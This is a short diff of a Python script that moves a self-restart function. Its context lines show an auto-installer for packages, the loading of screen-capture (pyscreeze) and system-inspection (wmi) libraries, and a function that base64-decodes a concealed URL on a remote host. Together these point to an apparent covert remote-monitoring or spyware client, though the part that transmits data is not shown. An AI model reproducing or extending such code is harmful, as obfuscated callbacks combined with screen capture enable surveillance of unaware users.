@@ -2,6 +2,10 @@ import os.path, subprocess, glob, time, signal, sys, threading
 import urllib.request as r
 import urllib.error, hashlib, hmac, base64, getpass
 
+def restartafterdelay(t, file=__file__):
+    subprocess.run(f"python -c import time, os; time.sleep({t}); os.system(\"python {file}\")")
+    sys.exit()
+    
 def importinstall(pipname,modulename=None,update=False,**importkwargs):
     if modulename is None:
         modulename = pipname
@@ -20,9 +24,6 @@ pyscreeze = importinstall('pyscreeze')
 wmi = importinstall('wmi')
 c = wmi.WMI()
 
-def restartafterdelay(t, file=__file__):
-    subprocess.run(f"python -c import time, os; time.sleep({t}); os.system(\"python {file}\")")
-    sys.exit()
 
 def a():
     u = base64.b64decode(b'aHR0cHM6Ly9jYXQ1LnB5dGhvbmFueXdoZXJlLmNvbS9iYWNrdXAvc3VzLw==').decode()
